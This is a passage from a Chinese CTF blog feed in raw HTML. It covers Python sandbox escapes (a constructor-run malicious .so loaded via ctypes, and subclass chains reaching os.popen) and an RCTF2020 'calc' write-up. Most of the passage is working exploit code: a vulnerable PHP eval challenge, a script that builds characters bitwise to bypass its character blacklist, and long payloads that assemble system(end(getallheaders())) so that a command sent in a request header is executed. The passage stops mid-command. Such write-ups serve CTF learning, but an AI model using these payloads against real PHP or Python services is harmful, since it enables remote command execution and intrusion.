class="line">    print(met + <span class="string">":"</span> + str(res[met]))</span><br></pre></td></tr></table></figure><p>  类的序号在不同的py版本，运行平台，以及import不同的包，都会造成<code>object</code>的子类数量不一样，序号也就不一样了。脚本也就构造下payload，远程打过去还得爆破序号。</p></li><li><h4 id="加载恶意so"><a href="#加载恶意so" class="headerlink" title="加载恶意so"></a>加载恶意so</h4><p>  利用<code>ctypes.LibraryLoader</code>加载恶意动态库执行命令。<code>ctypes</code>必须要导入，不然<code>object</code>不会有它。感觉有些鸡肋。</p><p>  evil.c</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">evil</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ls -la  &gt; /tmp/ls_la"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  poc.py</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">167</span>](<span class="string">'/tmp/evil.so'</span>)</span><br></pre></td></tr></table></figure><p>  <img src="/2020/06/python-web学习/image-20200701212037508.png" alt="image-20200701212037508"></p></li><li><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>  过滤<code>[</code>、<code>]</code>，应对的方式就是将[]的功能用pop 、<code>__getitem__</code> 代替（实际上a[0]就是在内部调用了<code>a.__getitem__(0)</code> )</p><p>   <code>&#39;&#39;.__class__.__mro__.__getitem__(1).__subclasses__().pop(59).__init__.func_globals.get(&#39;linecache&#39;).os.popen(&#39;whoami&#39;).read()</code></p></li></ul><ul><li><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>  <a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98" target="_blank" rel="noopener">沙盒逃逸备忘</a></p><p>  <a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">python-沙箱逃逸</a></p><p>  <a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      填填坑
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="web" scheme="https://0xcreed.jxustctf.top/tags/web/"/>
    
      <category term="python" scheme="https://0xcreed.jxustctf.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2020-复现</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/RCTF2020-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/RCTF2020-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-06-06T16:48:00.000Z</published>
    <updated>2020-06-28T11:49:32.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-calc"><a href="#1-calc" class="headerlink" title="1.calc"></a>1.calc</h3><p>RoarCTF2020的<a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">easy_calc</a>的升级版,过滤了更多字符，但思路还是一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $blacklist = [<span class="string">'[a-z]'</span>, <span class="string">'[\x7f-\xff]'</span>, <span class="string">'\s'</span>,<span class="string">"'"</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>, <span class="string">'_'</span>, <span class="string">'\\\\'</span>,<span class="string">'\^'</span>, <span class="string">','</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>​    在 PHP 中，将两个数字使用<code>.</code>拼接，会当做字符串来处理，返回的也是一个字符串。例如：<code>(1).(2)</code>出来的就是字符串<code>&quot;12&quot;</code>，然后可以用<code>{}</code>来代替<code>[]</code>来取单个字符。所以我们可以先获得一部分字符然后位运算获取所有的字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// .</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">//E</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;); <span class="comment">// +</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;); <span class="comment">//I</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// N</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;); <span class="comment">// F</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"1"</span> | <span class="string">"E"</span>);<span class="comment">//u</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"3"</span> | <span class="string">"E"</span>); <span class="comment">// w</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"4"</span> | <span class="string">"I"</span>); <span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"0"</span> | <span class="string">"I"</span>); <span class="comment">// y</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"0"</span> | <span class="string">"F"</span>); <span class="comment">//v</span></span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/0J9Omna8tmKWP9s4iSg10w" target="_blank" rel="noopener">chamd5的构造脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">strings = [<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'E'</span>,<span class="string">'u'</span>,<span class="string">'w'</span>,<span class="string">'&#125;'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>,<span class="string">'I'</span>,<span class="string">'N'</span>,<span class="string">'F'</span>,<span class="string">'y'</span>,<span class="string">'v'</span>]</span><br><span class="line"></span><br><span class="line">input_value = <span class="string">'o'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)|ord(s1))).strip()</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'|'</span>,s1)</span><br><span class="line"></span><br><span class="line">print(len(strings))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)&amp;ord(s1)))</span><br><span class="line">    data = data.strip()</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'&amp;'</span>,s1)</span><br><span class="line">print(len(strings))</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)|ord(s1))).strip()</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'|'</span>,s1)</span><br><span class="line">print(len(strings))</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      data = (chr(ord(s)&amp;ord(s1))).strip()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'&amp;'</span>,s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    data = chr(~ord(s))</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  data = data.strip()</span><br><span class="line">  <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">    strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success ~'</span>,s)</span><br></pre></td></tr></table></figure><p>手工拼了个 <code>pHpINFo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">''</span>;</span><br><span class="line">$a.=(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;)); <span class="comment">//p=y&amp;v</span></span><br><span class="line">$a.= (((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;);<span class="comment">//H=y&amp;N</span></span><br><span class="line">$a.=(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;)); <span class="comment">//p=y&amp;v</span></span><br><span class="line">$a.=(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;); <span class="comment">//I</span></span><br><span class="line">$a.=(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">//N</span></span><br><span class="line">$a.= (((<span class="number">3</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;);<span class="comment">//F=w &amp; N</span></span><br><span class="line">$a.= (((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;);<span class="comment">//o=E | +</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>完整的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">3</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;)))()</span><br></pre></td></tr></table></figure><p>后面的不拼了…… 直接用师傅们的payload</p><p>题目中断外网，并且需要<code>/readflag</code>，即需要一个shell. 进行命令执行.</p><ul><li>有几种方式</li></ul><ol><li><p>system(end(getallheaders()));</p></li><li><p>system(file_get_contents(“php://input”)); </p></li><li><p>把脚本内容写到一个文件, 最后执行  </p></li></ol><p><code>system(end(getallheaders()));的payload;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">9</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;);</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">-1</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;));</span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">//systEm</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">6</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//n</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">6</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//D</span></span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">//EnD</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// getallheaders</span></span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">8</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)))); <span class="comment">// g</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">//T</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//a</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// l</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// l</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// h</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//a</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//D</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">2</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">// r</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">// s</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后需要过<code>/readflag</code>的验证码, 可以使用使用<code>Perl</code>, 也可以通过 <code>php -r &quot;&quot;</code>的方式执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span 